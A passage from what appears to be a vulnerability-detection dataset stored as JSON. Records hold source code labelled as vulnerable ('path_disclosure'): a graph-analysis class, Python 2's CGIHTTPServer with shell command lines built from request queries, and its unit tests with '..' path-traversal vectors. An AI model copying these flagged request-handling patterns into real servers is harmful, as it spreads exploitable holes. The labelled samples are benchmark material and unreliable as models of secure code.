dist[k][w]:\n                            for p in list(shortest_paths[v][k]):\n                                for q in list(shortest_paths[k][w]):\n                                    shortest_paths[v][w].add(p+q[1:])\n\n        for v in self.nodes:\n            dist[v][v] = 0\n            shortest_paths[v][v].add((v,))\n\n        Log.add('finished.', Severity.INFO)\n\n        return shortest_paths\n\n\n    def getDistanceMatrixFirstOrder(self):\n        \"\"\"\n        Projects a distance matrix from a higher-order to\n        first-order nodes, while path lengths are calculated\n        based on the higher-order topology\n        \"\"\"\n\n        dist = self.getDistanceMatrix()\n        dist_first = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))\n\n        # calculate distances between first-order nodes based on distance in higher-order topology\n        for vk in dist:\n            for wk in dist[vk]:\n                v1 = self.HigherOrderNodeToPath(vk)[0]\n                w1 = self.HigherOrderNodeToPath(wk)[-1]\n                if dist[vk][wk] + self.order-1 < dist_first[v1][w1]:\n                    dist_first[v1][w1] = dist[vk][wk] + self.order - 1\n\n        return dist_first\n\n\n    def HigherOrderPathToFirstOrder(self, path):\n        \"\"\"\n        Maps a path in the higher-order network\n        to a path in the first-order network. As an\n        example, the second-order path ('a-b', 'b-c', 'c-d')\n        of length two is mapped to the first-order path ('a','b','c','d')\n        of length four. In general, a path of length l in a network of\n        order k is mapped to a path of length l+k-1 in the first-order network.\n\n        @param path: The higher-order path that shall be mapped to the first-order network\n        \"\"\"\n        p1 = self.HigherOrderNodeToPath(path[0])\n        for x in path[1:]:\n            p1 += (self.HigherOrderNodeToPath(x)[-1],)\n        return p1    \n\n\n    def reduceToGCC(self):\n        \"\"\"\n        Reduces the higher-order network to its\n        largest (giant) strongly connected component\n        (using Tarjan's algorithm)\n        \"\"\"\n\n        # nonlocal variables (!)\n        index = 0\n        S = []\n        indices = _co.defaultdict(lambda: None)\n        lowlink = _co.defaultdict(lambda: None)\n        onstack = _co.defaultdict(lambda: False)\n\n        # Tarjan's algorithm\n        def strong_connect(v):\n            nonlocal index\n            nonlocal S\n            nonlocal indices\n            nonlocal lowlink\n            nonlocal onstack\n\n            indices[v] = index\n            lowlink[v] = index\n            index += 1\n            S.append(v)\n            onstack[v] = True\n\n            for w in self.successors[v]:\n                if indices[w] == None:\n                    strong_connect(w)\n                    lowlink[v] = min(lowlink[v], lowlink[w])\n                elif onstack[w]:\n                    lowlink[v] = min(lowlink[v], indices[w])\n\n            # Generate SCC of node v\n            component = set()\n            if lowlink[v] == indices[v]:\n                while True:\n                    w = S.pop()\n                    onstack[w] = False\n                    component.add(w)\n                    if v == w:\n                        break\n            return component\n\n        # Get largest strongly connected component\n        components = _co.defaultdict(lambda: set())\n        max_size = 0\n        max_head = None\n        for v in self.nodes:\n            if indices[v] == None:\n                components[v] = strong_connect(v)\n                if len(components[v]) > max_size:\n                    max_head = v\n                    max_size = len(components[v])\n\n        scc = components[max_head]\n\n        # Reduce higher-order network to SCC\n        for v in list(self.nodes):\n            if v not in scc:\n                self.nodes.remove(v)\n                del self.successors[v]\n\n        for (v, w) in list(self.edges):\n            if v not in scc or w not in scc:\n                del self.edges[(v, w)]\n\n\n    def summary(self):\n        \"\"\"\n        Returns a string containing basic summary statistics\n        of this higher-order graphical model instance\n        \"\"\"\n\n        summary = 'Graphical model of order k = ' + str(self.order)\n        summary += '\\n'\n        summary += 'Nodes:\\t\\t\\t\\t' +  str(self.vcount()) + '\\n'\n        summary += 'Links:\\t\\t\\t\\t' + str(self.ecount()) + '\\n'\n        summary += 'Total weight (sub/longest):\\t' + str(self.totalEdgeWeight()[0]) + '/' + str(self.totalEdgeWeight()[1]) + '\\n'\n        return summary\n\n\n    def __str__(self):\n        \"\"\"\n        Returns the default string representation of\n        this graphical model instance\n        \"\"\"\n        return self.summary()\n\n\n    def getAdjacencyMatrix(self, includeSubPaths=True, weighted=True, transposed=False):\n        \"\"\"\n        Returns a sparse adjacency matrix of the higher-order network. By default, the entry\n            corresponding to a directed link source -> target is stored in row s and column t\n            and can be accessed via A[s,t].\n\n        @param includeSubPaths: if set to True, the returned adjacency matrix will\n            account for the occurrence of links of order k (i.e. paths of length k-1)\n            as subpaths\n\n        @param weighted: if set to False, the function returns a binary adjacency matrix.\n          If set to True, adjacency matrix entries will contain the weight of an edge.\n\n        @param transposed: whether to transpose the matrix or not.\n        \"\"\"\n\n        row = []\n        col = []\n        data = []\n\n        if transposed:\n            for s, t in self.edges:\n                row.append(self.nodes.index(t))\n                col.append(self.nodes.index(s))\n        else:\n            for s, t in self.edges:\n                row.append(self.nodes.index(s))\n                col.append(self.nodes.index(t))\n\n        # create array with non-zero entries\n        if not weighted:\n            data = _np.ones(len(self.edges.keys()))\n        else:\n            if includeSubPaths:\n                data = _np.array([float(x.sum()) for x in self.edges.values()])\n            else:\n                data = _np.array([float(x[1]) for x in self.edges.values()])\n\n        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()\n\n\n    def getTransitionMatrix(self, includeSubPaths=True):\n        \"\"\"\n        Returns a (transposed) random walk transition matrix\n        corresponding to the higher-order network.\n\n        @param includeSubpaths: whether or not to include subpath statistics in the\n            transition probability calculation (default True)\n        \"\"\"\n        row = []\n        col = []\n        data = []\n        # calculate weighted out-degrees (with or without subpaths)\n        if includeSubPaths:\n            D = [ self.outweights[x].sum() for x in self.nodes]\n        else:\n            D = [ self.outweights[x][1] for x in self.nodes]\n                \n        for (s, t) in self.edges:\n            # either s->t has been observed as a longest path, or we are interested in subpaths as well\n\n            # the following makes sure that we do not accidentially consider zero-weight edges (automatically added by default_dic)\n            if (self.edges[(s, t)][1] > 0) or (includeSubPaths and self.edges[(s, t)][0] > 0):\n                row.append(self.nodes.index(t))\n                col.append(self.nodes.index(s))\n                if includeSubPaths:\n                    count = self.edges[(s, t)].sum()\n                else:\n                    count = self.edges[(s, t)][1]\n                assert D[self.nodes.index(s)] > 0, 'Encountered zero out-degree for node ' + str(s) + ' while weight of link (' + str(s) +  ', ' + str(t) + ') is non-zero.'\n                prob = count / D[self.nodes.index(s)]\n                if prob < 0 or prob > 1:\n                    tn.Log.add('Encountered transition probability outside [0,1] range.', Severity.ERROR)\n                    raise ValueError()\n                data.append(prob)\n\n        data = _np.array(data)\n        data = data.reshape(data.size,)\n\n        return _sparse.coo_matrix((data, (row, col)), shape=(self.vcount(), self.vcount())).tocsr()\n\n\n    @staticmethod\n    def getLeadingEigenvector(A, normalized=True, lanczosVecs=15, maxiter=1000):\n        \"\"\"Compute normalized leading eigenvector of a given matrix A.\n\n        @param A: sparse matrix for which leading eigenvector will be computed\n        @param normalized: wheter or not to normalize. Default is C{True}\n        @param lanczosVecs: number of Lanczos vectors to be used in the approximate\n            calculation of eigenvectors and eigenvalues. This maps to the ncv parameter\n            of scipy's underlying function eigs.\n        @param maxiter: scaling factor for the number of iterations to be used in the\n            approximate calculation of eigenvectors and eigenvalues. The number of iterations\n            passed to scipy's underlying eigs function will be n*maxiter where n is the\n            number of rows/columns of the Laplacian matrix.\n        \"\"\"\n\n        if _sparse.issparse(A) == False:\n            raise TypeError(\"A must be a sparse matrix\")\n\n        # NOTE: ncv sets additional auxiliary eigenvectors that are computed\n        # NOTE: in order to be more confident to find the one with the largest\n        # NOTE: magnitude, see https://github.com/scipy/scipy/issues/4987\n        w, pi = _sla.eigs(A, k=1, which=\"LM\", ncv=lanczosVecs, maxiter=maxiter)\n        pi = pi.reshape(pi.size,)\n        if normalized:\n            pi /= sum(pi)\n        return pi\n\n\n    def getLaplacianMatrix(self, includeSubPaths=True):\n        \"\"\"\n        Returns the transposed Laplacian matrix corresponding to the higher-order network.\n\n        @param includeSubpaths: Whether or not subpath statistics shall be included in the\n            calculation of matrix weights\n        \"\"\"\n\n        T = self.getTransitionMatrix(includeSubPaths)\n        I = _sparse.identity(self.vcount())\n\n        return I-T\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "923ba361d8f757f0656cfd216525aca4848e02aa", "code": "Lib/CGIHTTPServer.py/n/n\"\"\"CGI-savvy HTTP Server.\n\nThis module builds on SimpleHTTPServer by implementing GET and POST\nrequests to cgi-bin scripts.\n\nIf the os.fork() function is not present (e.g. on Windows),\nos.popen2() is used as a fallback, with slightly altered semantics; if\nthat function is not present either (e.g. on Macintosh), only Python\nscripts are supported, and they are executed by the current process.\n\nIn all cases, the implementation is intentionally naive -- all\nrequests are executed sychronously.\n\nSECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL\n-- it may execute arbitrary Python code or external programs.\n\nNote that status code 200 is sent prior to execution of a CGI script, so\nscripts cannot send other status codes such as 302 (redirect).\n\"\"\"\n\n\n__version__ = \"0.4\"\n\n__all__ = [\"CGIHTTPRequestHandler\"]\n\nimport os\nimport sys\nimport urllib\nimport BaseHTTPServer\nimport SimpleHTTPServer\nimport select\n\n\nclass CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):\n\n    \"\"\"Complete HTTP server with GET, HEAD and POST commands.\n\n    GET and HEAD also support running CGI scripts.\n\n    The POST command is *only* implemented for CGI scripts.\n\n    \"\"\"\n\n    # Determine platform specifics\n    have_fork = hasattr(os, 'fork')\n    have_popen2 = hasattr(os, 'popen2')\n    have_popen3 = hasattr(os, 'popen3')\n\n    # Make rfile unbuffered -- we need to read one line and then pass\n    # the rest to a subprocess, so we can't use buffered input.\n    rbufsize = 0\n\n    def do_POST(self):\n        \"\"\"Serve a POST request.\n\n        This is only implemented for CGI scripts.\n\n        \"\"\"\n\n        if self.is_cgi():\n            self.run_cgi()\n        else:\n            self.send_error(501, \"Can only POST to CGI scripts\")\n\n    def send_head(self):\n        \"\"\"Version of send_head that support CGI scripts\"\"\"\n        if self.is_cgi():\n            return self.run_cgi()\n        else:\n            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)\n\n    def is_cgi(self):\n        \"\"\"Test whether self.path corresponds to a CGI script.\n\n        Returns True and updates the cgi_info attribute to the tuple\n        (dir, rest) if self.path requires running a CGI script.\n        Returns False otherwise.\n\n        The default implementation tests whether the normalized url\n        path begins with one of the strings in self.cgi_directories\n        (and the next character is a '/' or the end of the string).\n        \"\"\"\n        splitpath = _url_collapse_path_split(self.path)\n        if splitpath[0] in self.cgi_directories:\n            self.cgi_info = splitpath\n            return True\n        return False\n\n    cgi_directories = ['/cgi-bin', '/htbin']\n\n    def is_executable(self, path):\n        \"\"\"Test whether argument path is an executable file.\"\"\"\n        return executable(path)\n\n    def is_python(self, path):\n        \"\"\"Test whether argument path is a Python script.\"\"\"\n        head, tail = os.path.splitext(path)\n        return tail.lower() in (\".py\", \".pyw\")\n\n    def run_cgi(self):\n        \"\"\"Execute a CGI script.\"\"\"\n        path = self.path\n        dir, rest = self.cgi_info\n\n        i = path.find('/', len(dir) + 1)\n        while i >= 0:\n            nextdir = path[:i]\n            nextrest = path[i+1:]\n\n            scriptdir = self.translate_path(nextdir)\n            if os.path.isdir(scriptdir):\n                dir, rest = nextdir, nextrest\n                i = path.find('/', len(dir) + 1)\n            else:\n                break\n\n        # find an explicit query string, if present.\n        i = rest.rfind('?')\n        if i >= 0:\n            rest, query = rest[:i], rest[i+1:]\n        else:\n            query = ''\n\n        # dissect the part after the directory name into a script name &\n        # a possible additional path, to be stored in PATH_INFO.\n        i = rest.find('/')\n        if i >= 0:\n            script, rest = rest[:i], rest[i:]\n        else:\n            script, rest = rest, ''\n\n        scriptname = dir + '/' + script\n        scriptfile = self.translate_path(scriptname)\n        if not os.path.exists(scriptfile):\n            self.send_error(404, \"No such CGI script (%r)\" % scriptname)\n            return\n        if not os.path.isfile(scriptfile):\n            self.send_error(403, \"CGI script is not a plain file (%r)\" %\n                            scriptname)\n            return\n        ispy = self.is_python(scriptname)\n        if not ispy:\n            if not (self.have_fork or self.have_popen2 or self.have_popen3):\n                self.send_error(403, \"CGI script is not a Python script (%r)\" %\n                                scriptname)\n                return\n            if not self.is_executable(scriptfile):\n                self.send_error(403, \"CGI script is not executable (%r)\" %\n                                scriptname)\n                return\n\n        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html\n        # XXX Much of the following could be prepared ahead of time!\n        env = {}\n        env['SERVER_SOFTWARE'] = self.version_string()\n        env['SERVER_NAME'] = self.server.server_name\n        env['GATEWAY_INTERFACE'] = 'CGI/1.1'\n        env['SERVER_PROTOCOL'] = self.protocol_version\n        env['SERVER_PORT'] = str(self.server.server_port)\n        env['REQUEST_METHOD'] = self.command\n        uqrest = urllib.unquote(rest)\n        env['PATH_INFO'] = uqrest\n        env['PATH_TRANSLATED'] = self.translate_path(uqrest)\n        env['SCRIPT_NAME'] = scriptname\n        if query:\n            env['QUERY_STRING'] = query\n        host = self.address_string()\n        if host != self.client_address[0]:\n            env['REMOTE_HOST'] = host\n        env['REMOTE_ADDR'] = self.client_address[0]\n        authorization = self.headers.getheader(\"authorization\")\n        if authorization:\n            authorization = authorization.split()\n            if len(authorization) == 2:\n                import base64, binascii\n                env['AUTH_TYPE'] = authorization[0]\n                if authorization[0].lower() == \"basic\":\n                    try:\n                        authorization = base64.decodestring(authorization[1])\n                    except binascii.Error:\n                        pass\n                    else:\n                        authorization = authorization.split(':')\n                        if len(authorization) == 2:\n                            env['REMOTE_USER'] = authorization[0]\n        # XXX REMOTE_IDENT\n        if self.headers.typeheader is None:\n            env['CONTENT_TYPE'] = self.headers.type\n        else:\n            env['CONTENT_TYPE'] = self.headers.typeheader\n        length = self.headers.getheader('content-length')\n        if length:\n            env['CONTENT_LENGTH'] = length\n        referer = self.headers.getheader('referer')\n        if referer:\n            env['HTTP_REFERER'] = referer\n        accept = []\n        for line in self.headers.getallmatchingheaders('accept'):\n            if line[:1] in \"\\t\\n\\r \":\n                accept.append(line.strip())\n            else:\n                accept = accept + line[7:].split(',')\n        env['HTTP_ACCEPT'] = ','.join(accept)\n        ua = self.headers.getheader('user-agent')\n        if ua:\n            env['HTTP_USER_AGENT'] = ua\n        co = filter(None, self.headers.getheaders('cookie'))\n        if co:\n            env['HTTP_COOKIE'] = ', '.join(co)\n        # XXX Other HTTP_* headers\n        # Since we're setting the env in the parent, provide empty\n        # values to override previously set values\n        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',\n                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):\n            env.setdefault(k, \"\")\n        os.environ.update(env)\n\n        self.send_response(200, \"Script output follows\")\n\n        decoded_query = query.replace('+', ' ')\n\n        if self.have_fork:\n            # Unix -- fork as we should\n            args = [script]\n            if '=' not in decoded_query:\n                args.append(decoded_query)\n            nobody = nobody_uid()\n            self.wfile.flush() # Always flush before forking\n            pid = os.fork()\n            if pid != 0:\n                # Parent\n                pid, sts = os.waitpid(pid, 0)\n                # throw away additional data [see bug #427345]\n                while select.select([self.rfile], [], [], 0)[0]:\n                    if not self.rfile.read(1):\n                        break\n                if sts:\n                    self.log_error(\"CGI script exit status %#x\", sts)\n                return\n            # Child\n            try:\n                try:\n                    os.setuid(nobody)\n                except os.error:\n                    pass\n                os.dup2(self.rfile.fileno(), 0)\n                os.dup2(self.wfile.fileno(), 1)\n                os.execve(scriptfile, args, os.environ)\n            except:\n                self.server.handle_error(self.request, self.client_address)\n                os._exit(127)\n\n        elif self.have_popen2 or self.have_popen3:\n            # Windows -- use popen2 or popen3 to create a subprocess\n            import shutil\n            if self.have_popen3:\n                popenx = os.popen3\n            else:\n                popenx = os.popen2\n            cmdline = scriptfile\n            if self.is_python(scriptfile):\n                interp = sys.executable\n                if interp.lower().endswith(\"w.exe\"):\n                    # On Windows, use python.exe, not pythonw.exe\n                    interp = interp[:-5] + interp[-4:]\n                cmdline = \"%s -u %s\" % (interp, cmdline)\n            if '=' not in query and '\"' not in query:\n                cmdline = '%s \"%s\"' % (cmdline, query)\n            self.log_message(\"command: %s\", cmdline)\n            try:\n                nbytes = int(length)\n            except (TypeError, ValueError):\n                nbytes = 0\n            files = popenx(cmdline, 'b')\n            fi = files[0]\n            fo = files[1]\n            if self.have_popen3:\n                fe = files[2]\n            if self.command.lower() == \"post\" and nbytes > 0:\n                data = self.rfile.read(nbytes)\n                fi.write(data)\n            # throw away additional data [see bug #427345]\n            while select.select([self.rfile._sock], [], [], 0)[0]:\n                if not self.rfile._sock.recv(1):\n                    break\n            fi.close()\n            shutil.copyfileobj(fo, self.wfile)\n            if self.have_popen3:\n                errors = fe.read()\n                fe.close()\n                if errors:\n                    self.log_error('%s', errors)\n            sts = fo.close()\n            if sts:\n                self.log_error(\"CGI script exit status %#x\", sts)\n            else:\n                self.log_message(\"CGI script exited OK\")\n\n        else:\n            # Other O.S. -- execute script in this process\n            save_argv = sys.argv\n            save_stdin = sys.stdin\n            save_stdout = sys.stdout\n            save_stderr = sys.stderr\n            try:\n                save_cwd = os.getcwd()\n                try:\n                    sys.argv = [scriptfile]\n                    if '=' not in decoded_query:\n                        sys.argv.append(decoded_query)\n                    sys.stdout = self.wfile\n                    sys.stdin = self.rfile\n                    execfile(scriptfile, {\"__name__\": \"__main__\"})\n                finally:\n                    sys.argv = save_argv\n                    sys.stdin = save_stdin\n                    sys.stdout = save_stdout\n                    sys.stderr = save_stderr\n                    os.chdir(save_cwd)\n            except SystemExit, sts:\n                self.log_error(\"CGI script exit status %s\", str(sts))\n            else:\n                self.log_message(\"CGI script exited OK\")\n\n\n# TODO(gregory.p.smith): Move this into an appropriate library.\ndef _url_collapse_path_split(path):\n    \"\"\"\n    Given a URL path, remove extra '/'s and '.' path elements and collapse\n    any '..' references.\n\n    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.\n\n    Returns: A tuple of (head, tail) where tail is everything after the final /\n    and head is everything before it.  Head will always start with a '/' and,\n    if it contains anything else, never have a trailing '/'.\n\n    Raises: IndexError if too many '..' occur within the path.\n    \"\"\"\n    # Similar to os.path.split(os.path.normpath(path)) but specific to URL\n    # path semantics rather than local operating system semantics.\n    path_parts = []\n    for part in path.split('/'):\n        if part == '.':\n            path_parts.append('')\n        else:\n            path_parts.append(part)\n    # Filter out blank non trailing parts before consuming the '..'.\n    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]\n    if path_parts:\n        tail_part = path_parts.pop()\n    else:\n        tail_part = ''\n    head_parts = []\n    for part in path_parts:\n        if part == '..':\n            head_parts.pop()\n        else:\n            head_parts.append(part)\n    if tail_part and tail_part == '..':\n        head_parts.pop()\n        tail_part = ''\n    return ('/' + '/'.join(head_parts), tail_part)\n\n\nnobody = None\n\ndef nobody_uid():\n    \"\"\"Internal routine to get nobody's uid\"\"\"\n    global nobody\n    if nobody:\n        return nobody\n    try:\n        import pwd\n    except ImportError:\n        return -1\n    try:\n        nobody = pwd.getpwnam('nobody')[2]\n    except KeyError:\n        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))\n    return nobody\n\n\ndef executable(path):\n    \"\"\"Test for executable file.\"\"\"\n    try:\n        st = os.stat(path)\n    except os.error:\n        return False\n    return st.st_mode & 0111 != 0\n\n\ndef test(HandlerClass = CGIHTTPRequestHandler,\n         ServerClass = BaseHTTPServer.HTTPServer):\n    SimpleHTTPServer.test(HandlerClass, ServerClass)\n\n\nif __name__ == '__main__':\n    test()\n/n/n/nLib/test/test_httpservers.py/n/n\"\"\"Unittests for the various HTTPServer modules.\n\nWritten by Cody A.W. Somerville <cody-somerville@ubuntu.com>,\nJosip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.\n\"\"\"\n\nfrom BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer\nfrom SimpleHTTPServer import SimpleHTTPRequestHandler\nfrom CGIHTTPServer import CGIHTTPRequestHandler\nimport CGIHTTPServer\n\nimport os\nimport sys\nimport base64\nimport shutil\nimport urllib\nimport httplib\nimport tempfile\nimport threading\n\nimport unittest\nfrom test import test_support\n\n\nclass NoLogRequestHandler:\n    def log_message(self, *args):\n        # don't write log messages to stderr\n        pass\n\n\nclass TestServerThread(threading.Thread):\n    def __init__(self, test_object, request_handler):\n        threading.Thread.__init__(self)\n        self.request_handler = request_handler\n        self.test_object = test_object\n        self.test_object.lock.acquire()\n\n    def run(self):\n        self.server = HTTPServer(('', 0), self.request_handler)\n        self.test_object.PORT = self.server.socket.getsockname()[1]\n        self.test_object.lock.release()\n        try:\n            self.server.serve_forever()\n        finally:\n            self.server.server_close()\n\n    def stop(self):\n        self.server.shutdown()\n\n\nclass BaseTestCase(unittest.TestCase):\n    def setUp(self):\n        self.lock = threading.Lock()\n        self.thread = TestServerThread(self, self.request_handler)\n        self.thread.start()\n        self.lock.acquire()\n\n    def tearDown(self):\n        self.lock.release()\n        self.thread.stop()\n\n    def request(self, uri, method='GET', body=None, headers={}):\n        self.connection = httplib.HTTPConnection('localhost', self.PORT)\n        self.connection.request(method, uri, body, headers)\n        return self.connection.getresponse()\n\n\nclass BaseHTTPServerTestCase(BaseTestCase):\n    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):\n        protocol_version = 'HTTP/1.1'\n        default_request_version = 'HTTP/1.1'\n\n        def do_TEST(self):\n            self.send_response(204)\n            self.send_header('Content-Type', 'text/html')\n            self.send_header('Connection', 'close')\n            self.end_headers()\n\n        def do_KEEP(self):\n            self.send_response(204)\n            self.send_header('Content-Type', 'text/html')\n            self.send_header('Connection', 'keep-alive')\n            self.end_headers()\n\n        def do_KEYERROR(self):\n            self.send_error(999)\n\n        def do_CUSTOM(self):\n            self.send_response(999)\n            self.send_header('Content-Type', 'text/html')\n            self.send_header('Connection', 'close')\n            self.end_headers()\n\n    def setUp(self):\n        BaseTestCase.setUp(self)\n        self.con = httplib.HTTPConnection('localhost', self.PORT)\n        self.con.connect()\n\n    def test_command(self):\n        self.con.request('GET', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_request_line_trimming(self):\n        self.con._http_vsn_str = 'HTTP/1.1\\n'\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_version_bogus(self):\n        self.con._http_vsn_str = 'FUBAR'\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 400)\n\n    def test_version_digits(self):\n        self.con._http_vsn_str = 'HTTP/9.9.9'\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 400)\n\n    def test_version_none_get(self):\n        self.con._http_vsn_str = ''\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_version_none(self):\n        self.con._http_vsn_str = ''\n        self.con.putrequest('PUT', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 400)\n\n    def test_version_invalid(self):\n        self.con._http_vsn = 99\n        self.con._http_vsn_str = 'HTTP/9.9'\n        self.con.putrequest('GET', '/')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 505)\n\n    def test_send_blank(self):\n        self.con._http_vsn_str = ''\n        self.con.putrequest('', '')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 400)\n\n    def test_header_close(self):\n        self.con.putrequest('GET', '/')\n        self.con.putheader('Connection', 'close')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_head_keep_alive(self):\n        self.con._http_vsn_str = 'HTTP/1.1'\n        self.con.putrequest('GET', '/')\n        self.con.putheader('Connection', 'keep-alive')\n        self.con.endheaders()\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 501)\n\n    def test_handler(self):\n        self.con.request('TEST', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 204)\n\n    def test_return_header_keep_alive(self):\n        self.con.request('KEEP', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.getheader('Connection'), 'keep-alive')\n        self.con.request('TEST', '/')\n\n    def test_internal_key_error(self):\n        self.con.request('KEYERROR', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 999)\n\n    def test_return_custom_status(self):\n        self.con.request('CUSTOM', '/')\n        res = self.con.getresponse()\n        self.assertEquals(res.status, 999)\n\n\nclass SimpleHTTPServerTestCase(BaseTestCase):\n    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):\n        pass\n\n    def setUp(self):\n        BaseTestCase.setUp(self)\n        self.cwd = os.getcwd()\n        basetempdir = tempfile.gettempdir()\n        os.chdir(basetempdir)\n        self.data = 'We are the knights who say Ni!'\n        self.tempdir = tempfile.mkdtemp(dir=basetempdir)\n        self.tempdir_name = os.path.basename(self.tempdir)\n        temp = open(os.path.join(self.tempdir, 'test'), 'wb')\n        temp.write(self.data)\n        temp.close()\n\n    def tearDown(self):\n        try:\n            os.chdir(self.cwd)\n            try:\n                shutil.rmtree(self.tempdir)\n            except:\n                pass\n        finally:\n            BaseTestCase.tearDown(self)\n\n    def check_status_and_reason(self, response, status, data=None):\n        body = response.read()\n        self.assert_(response)\n        self.assertEquals(response.status, status)\n        self.assert_(response.reason != None)\n        if data:\n            self.assertEqual(data, body)\n\n    def test_get(self):\n        #constructs the path relative to the root directory of the HTTPServer\n        response = self.request(self.tempdir_name + '/test')\n        self.check_status_and_reason(response, 200, data=self.data)\n        response = self.request(self.tempdir_name + '/')\n        self.check_status_and_reason(response, 200)\n        response = self.request(self.tempdir_name)\n        self.check_status_and_reason(response, 301)\n        response = self.request('/ThisDoesNotExist')\n        self.check_status_and_reason(response, 404)\n        response = self.request('/' + 'ThisDoesNotExist' + '/')\n        self.check_status_and_reason(response, 404)\n        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')\n        response = self.request('/' + self.tempdir_name + '/')\n        self.check_status_and_reason(response, 200)\n        if os.name == 'posix':\n            # chmod won't work as expected on Windows platforms\n            os.chmod(self.tempdir, 0)\n            response = self.request(self.tempdir_name + '/')\n            self.check_status_and_reason(response, 404)\n            os.chmod(self.tempdir, 0755)\n\n    def test_head(self):\n        response = self.request(\n            self.tempdir_name + '/test', method='HEAD')\n        self.check_status_and_reason(response, 200)\n        self.assertEqual(response.getheader('content-length'),\n                         str(len(self.data)))\n        self.assertEqual(response.getheader('content-type'),\n                         'application/octet-stream')\n\n    def test_invalid_requests(self):\n        response = self.request('/', method='FOO')\n        self.check_status_and_reason(response, 501)\n        # requests must be case sensitive,so this should fail too\n        response = self.request('/', method='get')\n        self.check_status_and_reason(response, 501)\n        response = self.request('/', method='GETs')\n        self.check_status_and_reason(response, 501)\n\n\ncgi_file1 = \"\"\"\\\n#!%s\n\nprint \"Content-type: text/html\"\nprint\nprint \"Hello World\"\n\"\"\"\n\ncgi_file2 = \"\"\"\\\n#!%s\nimport cgi\n\nprint \"Content-type: text/html\"\nprint\n\nform = cgi.FieldStorage()\nprint \"%%s, %%s, %%s\" %% (form.getfirst(\"spam\"), form.getfirst(\"eggs\"),\\\n              form.getfirst(\"bacon\"))\n\"\"\"\n\nclass CGIHTTPServerTestCase(BaseTestCase):\n    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):\n        pass\n\n    def setUp(self):\n        BaseTestCase.setUp(self)\n        self.parent_dir = tempfile.mkdtemp()\n        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')\n        os.mkdir(self.cgi_dir)\n\n        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')\n        with open(self.file1_path, 'w') as file1:\n            file1.write(cgi_file1 % sys.executable)\n        os.chmod(self.file1_path, 0777)\n\n        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')\n        with open(self.file2_path, 'w') as file2:\n            file2.write(cgi_file2 % sys.executable)\n        os.chmod(self.file2_path, 0777)\n\n        self.cwd = os.getcwd()\n        os.chdir(self.parent_dir)\n\n    def tearDown(self):\n        try:\n            os.chdir(self.cwd)\n            os.remove(self.file1_path)\n            os.remove(self.file2_path)\n            os.rmdir(self.cgi_dir)\n            os.rmdir(self.parent_dir)\n        finally:\n            BaseTestCase.tearDown(self)\n\n    def test_url_collapse_path_split(self):\n        test_vectors = {\n            '': ('/', ''),\n            '..': IndexError,\n            '/.//..': IndexError,\n            '/': ('/', ''),\n            '//': ('/', ''),\n            '/\\\\': ('/', '\\\\'),\n            '/.//': ('/', ''),\n            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),\n            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),\n            'a': ('/', 'a'),\n            '/a': ('/', 'a'),\n            '//a': ('/', 'a'),\n            './a': ('/', 'a'),\n            './C:/': ('/C:', ''),\n            '/a/b': ('/a', 'b'),\n            '/a/b/': ('/a/b', ''),\n            '/a/b/c/..': ('/a/b', ''),\n            '/a/b/c/../d': ('/a/b', 'd'),\n            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),\n            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),\n            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),\n            '../a/b/c/../d/e/.././././..//f': IndexError,\n            '/a/b/c/../d/e/../../../f': ('/a', 'f'),\n            '/a/b/c/../d/e/../../../../f': ('/', 'f'),\n            '/a/b/c/../d/e/../../../../../f': IndexError,\n            '/a/b/c/../d/e/../../../../f/..': ('/', ''),\n        }\n        for path, expected in test_vectors.iteritems():\n            if isinstance(expected, type) and issubclass(expected, Exception):\n                self.assertRaises(expected,\n                                  CGIHTTPServer._url_collapse_path_split, path)\n            else:\n                actual = CGIHTTPServer._url_collapse_path_split(path)\n                self.assertEquals(expected, actual,\n                                  msg='path = %r\\nGot:    %r\\nWanted: %r' % (\n                                  path, actual, expected))\n\n    def test_headers_and_content(self):\n        res = self.request('/cgi-bin/file1.py')\n        self.assertEquals(('Hello World\\n', 'text/html', 